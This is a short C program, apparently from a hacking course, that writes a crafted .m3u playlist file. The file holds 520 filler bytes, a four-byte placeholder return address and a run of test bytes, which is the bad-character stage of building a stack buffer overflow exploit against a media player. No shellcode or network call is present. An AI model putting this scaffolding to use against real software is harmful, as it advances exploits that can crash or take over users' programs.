#include <stdio.h>
#include <stdlib.h>		
#include <string.h>

int main() {
	char* fill = malloc(521 * sizeof(char));
	char* ret = "BBBB";
	int i;
	FILE* fp;

	memset(fill, 'A', 520 * sizeof(char)); // preenche 520 posições de memoria -> de 0 a 519
	fill[520] = '\0'; // preenche a ultima com o sinalizador de final da string	

	fp = fopen("C:\\Users\\lucca\\OneDrive\\Documentos\\Projetos\\Universidade Hacker\\Xplts\\bad.m3u", "wb");

	if (!fp) {
		printf("Erro ao abrir o arquivo!\n");
		return 1;
	}

	// fwrite para escrever os dados binários diretamente no arquivo
	fwrite(fill, sizeof(char), 520, fp);
	fwrite(ret, sizeof(char), 4, fp);

	// Escreva todos os bytes de 0x00 a 0xFF no arquivo
	for (i = 0; i <= 0xFF; i++) {
		if ((i == 0x00) || (i == 0x0A) || (i == 0x0D) || (i == 0x2D) || (i == 0x5C) || (i == 0x5F)) continue;
		fwrite(&i, 1, 1, fp);
	}

	free(fill);



	fclose(fp);  // Fecha o arquivo



	return 0;
}